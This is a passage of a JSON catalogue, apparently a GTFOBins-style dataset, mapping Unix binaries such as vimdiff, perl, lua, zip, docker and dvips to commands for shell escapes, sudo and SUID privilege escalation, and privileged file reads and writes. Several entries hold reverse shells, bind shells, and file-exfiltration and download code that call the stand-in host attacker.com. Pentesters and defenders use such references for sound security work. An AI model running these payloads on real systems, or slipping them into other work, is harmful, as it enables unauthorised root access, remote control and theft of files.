          "code": "TF=$(mktemp)\nchmod +x $TF\necho -e '#!/bin/sh\\n/bin/sh 1>&0' >$TF\nsudo wget --use-askpass=$TF 0\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "su": {
    "description": "",
    "functions": {
      "sudo": [
        {
          "code": "sudo su",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "zip": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file-to-read\nTF=$(mktemp -u)\nzip $TF $LFILE\nunzip -p $TF\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "shell": [
        {
          "code": "TF=$(mktemp -u)\nzip $TF /etc/hosts -T -TT 'sh #'\nrm $TF\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "TF=$(mktemp -u)\nsudo zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "limited-suid": [
        {
          "code": "TF=$(mktemp -u)\n./zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF\n",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "nasm": {
    "description": "The file content is treated as command line options and disclosed throught error messages, so this is not suitable for reading arbitrary binary data.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nnasm -@ $LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./nasm -@ $LFILE\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo nasm -@ $LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "vimdiff": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "vimdiff -c ':!/bin/sh'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "vimdiff\n:set shell=/bin/sh\n:shell\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "vimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "vimdiff -c ':lua os.execute(\"reset; exec sh\")'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "reverse-shell": [
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\nvimdiff -c ':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")\nvim.command(\":q!\")'\n",
          "description": "It can send back a reverse shell to a listening attacker to open a remote network access."
        }
      ],
      "non-interactive-reverse-shell": [
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\nvimdiff -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'\n",
          "description": "It can send back a non-interactive reverse shell to a listening attacker to open a remote network access."
        }
      ],
      "non-interactive-bind-shell": [
        {
          "code": "export LPORT=12345\nvimdiff -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'\n",
          "description": "It can bind a non-interactive shell to a local port to allow remote network access."
        }
      ],
      "file-upload": [
        {
          "code": "export URL=http://attacker.com/\nexport LFILE=file_to_send\nvimdiff -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))\nvim.command(\":q!\")'\n",
          "description": "It can exfiltrate files on the network."
        },
        {
          "code": "export LPORT=8888\nvimdiff -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()\nvim.command(\":q!\")'\n",
          "description": "It can exfiltrate files on the network."
        },
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nvimdiff -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  t:send(d);\n  t:close();'\n",
          "description": "It can exfiltrate files on the network."
        }
      ],
      "file-download": [
        {
          "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nvimdiff -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])\nvim.command(\":q!\")'\n",
          "description": "It can download remote files."
        },
        {
          "code": "export LPORT=12345\nexport LFILE=file_to_save\nvimdiff -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(os.getenv(\"LFILE\"), \"wb\");\n  f:write(d);\n  io.close(f);'\n",
          "description": "It can download remote files."
        }
      ],
      "file-write": [
        {
          "code": "vimdiff file_to_write\niDATA\n^[\nw\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "vimdiff file_to_read",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "library-load": [
        {
          "code": "vimdiff -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'",
          "description": "It loads shared libraries that may be used to run code in the binary execution context."
        }
      ],
      "suid": [
        {
          "code": "./vimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo vimdiff -c ':!/bin/sh'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        },
        {
          "code": "sudo vimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        },
        {
          "code": "sudo vimdiff -c ':lua os.execute(\"reset; exec sh\")'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "capabilities": [
        {
          "code": "./vimdiff -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
          "description": "If the binary has the Linux `CAP_SETUID` capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID."
        }
      ],
      "limited-suid": [
        {
          "code": "./vimdiff -c ':lua os.execute(\"reset; exec sh\")'",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "pax": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\npax -w \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ]
    }
  },
  "batcat": {
    "description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply. `--paging always` can be omitted provided that the output doesn't fit the screen.",
    "functions": {
      "shell": [
        {
          "code": "batcat --paging always /etc/profile\n!/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "limited-suid": [
        {
          "code": "./batcat --paging always /etc/profile\n!/bin/sh\n",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo batcat --paging always /etc/profile\n!/bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "taskset": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "taskset 1 /bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./taskset 1 /bin/sh -p",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo taskset 1 /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "uniq": {
    "description": "The read file content is corrupted by squashing multiple adjacent lines.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nuniq \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./uniq \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo uniq \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "service": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "/usr/sbin/service ../../bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo service ../../bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "pkg": {
    "description": "",
    "functions": {
      "sudo": [
        {
          "code": "sudo pkg install -y --no-repo-update ./x-1.0.txz\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "perl": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "perl -e 'exec \"/bin/sh\";'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-read": [
        {
          "code": "LFILE=file_to_read\nperl -ne print $LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "reverse-shell": [
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\nperl -e 'use Socket;$i=\"$ENV{RHOST}\";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n",
          "description": "It can send back a reverse shell to a listening attacker to open a remote network access."
        }
      ],
      "suid": [
        {
          "code": "./perl -e 'exec \"/bin/sh\";'",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo perl -e 'exec \"/bin/sh\";'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "capabilities": [
        {
          "code": "./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'",
          "description": "If the binary has the Linux `CAP_SETUID` capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID."
        }
      ]
    }
  },
  "aa-exec": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "aa-exec /bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./aa-exec /bin/sh -p",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo aa-exec /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "sshpass": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "sshpass /bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./sshpass /bin/sh -p",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo sshpass /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "base58": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nbase58 \"$LFILE\" | base58 --decode\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo base58 \"$LFILE\" | base58 --decode\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "head": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nhead -c1G \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./head -c1G \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo head -c1G \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "iconv": {
    "description": "The `8859_1` encoding is used as it accepts any single-byte sequence, thus it allows to read/write arbitrary files. Other encoding combinations may corrupt the result.",
    "functions": {
      "file-write": [
        {
          "code": "LFILE=file_to_write\necho \"DATA\" | iconv -f 8859_1 -t 8859_1 -o \"$LFILE\"\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "LFILE=file_to_read\niconv -f 8859_1 -t 8859_1 \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "dvips": {
    "description": "The `texput.dvi` output file produced by `tex` can be created offline and uploaded to the target.",
    "functions": {
      "shell": [
        {
          "code": "tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'\ndvips -R0 texput.dvi\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'\nsudo dvips -R0 texput.dvi\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "limited-suid": [
        {
          "code": "tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'\n./dvips -R0 texput.dvi\n",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "crontab": {
    "description": "",
    "functions": {
      "command": [
        {
          "code": "crontab -e",
          "description": "It can be used to break out from restricted environments by running non-interactive system commands."
        }
      ],
      "sudo": [
        {
          "code": "sudo crontab -e",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "docker": {
    "description": "This requires the user to be privileged enough to run docker, i.e. being in the `docker` group or being `root`.\n\nAny other Docker Linux image should work, e.g., `debian`.\n",
    "functions": {
      "shell": [
        {
          "code": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-write": [
        {
          "code": "CONTAINER_ID=\"$(docker run -d alpine)\" # or existing\nTF=$(mktemp)\necho \"DATA\" > $TF\ndocker cp $TF $CONTAINER_ID:$TF\ndocker cp $CONTAINER_ID:$TF file_to_write\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "CONTAINER_ID=\"$(docker run -d alpine)\"  # or existing\nTF=$(mktemp)\ndocker cp file_to_read $CONTAINER_ID:$TF\ndocker cp $CONTAINER_ID:$TF $TF\ncat $TF\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "suid": [
        {
          "code": "./docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "ssh-keyscan": {
    "description": "The file content is actually parsed so only a part of each line is returned as a part of an error message.\n",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nssh-keyscan -f $LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./ssh-keyscan -f $LFILE\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo ssh-keyscan -f $LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "lua": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "lua -e 'os.execute(\"/bin/sh\")'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "non-interactive-reverse-shell": [
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\nlua -e 'local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'\n",
          "description": "It can send back a non-interactive reverse shell to a listening attacker to open a remote network access."
        }
      ],
      "non-interactive-bind-shell": [
        {
          "code": "export LPORT=12345\nlua -e 'local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'\n",
          "description": "It can bind a non-interactive shell to a local port to allow remote network access."
        }
      ],
      "file-upload": [
        {
          "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nlua -e '\n  local f=io.open(os.getenv(\"LFILE\"), 'rb')\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  t:send(d);\n  t:close();'\n",
          "description": "It can exfiltrate files on the network."
        }
      ],
      "file-download": [
        {
          "code": "export LPORT=12345\nexport LFILE=file_to_save\nlua -e 'local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(os.getenv(\"LFILE\"), \"wb\");\n  f:write(d);\n  io.close(f);'\n",
          "description": "It can download remote files."
        }
      ],
      "file-write": [
        {
          "code": "lua -e 'local f=io.open(\"file_to_write\", \"wb\"); f:write(\"DATA\"); io.close(f);'",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "lua -e 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);'",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "lua -e 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);'",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo lua -e 'os.execute(\"/bin/sh\")'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "limited-suid": [
        {
          "code": "./lua -e 'os.execute(\"/bin/sh\")'",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "sg": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "sg $(id -ng)\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo sg root\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "nohup": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "nohup /bin/sh -c \"sh <$(tty) >$(tty) 2>$(tty)\"",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "command": [
        {
          "code": "COMMAND='/usr/bin/id'\nnohup \"$COMMAND\"\ncat nohup.out\n",
          "description": "It can be used to break out from restricted environments by running non-interactive system commands."
        }
      ],
      "suid": [
        {
          "code": "./nohup /bin/sh -p -c \"sh -p <$(tty) >$(tty) 2>$(tty)\"",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo nohup /bin/sh -c \"sh <$(tty) >$(tty) 2>$(tty)\"",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "msfconsole": {
    "description": "This allows to spawn a [`ruby`](/gtfobins/ruby/) interpreter.",
    "functions": {
      "shell": [
        {
          "code": "sudo msfconsole\nmsf6 > irb\n>> system(\"/bin/sh\")\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo msfconsole\nmsf6 > irb\n>> system(\"/bin/sh\")\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "clamscan": {
    "description": "Each line of the file is interpreted as a path and the content is leaked via error messages, thus this might not be suitable to read binary files. The output can optionally be cleaned using `sed`.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nTF=$(mktemp -d)\ntouch $TF/empty.yara\nclamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
